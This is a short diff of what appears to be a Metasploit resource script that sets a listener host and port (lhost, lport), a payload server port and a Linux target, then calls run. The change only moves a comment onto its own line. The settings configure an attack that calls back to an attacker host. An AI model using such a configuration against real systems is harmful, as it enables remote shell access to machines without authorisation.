@@ -4,5 +4,6 @@ set srvport 2127
 set lhost 124.x.x.x
 set srvhost 0.0.0.0
 set lport 2126
-set target 7 # linux
+# set target as linux
+set target 7
 run
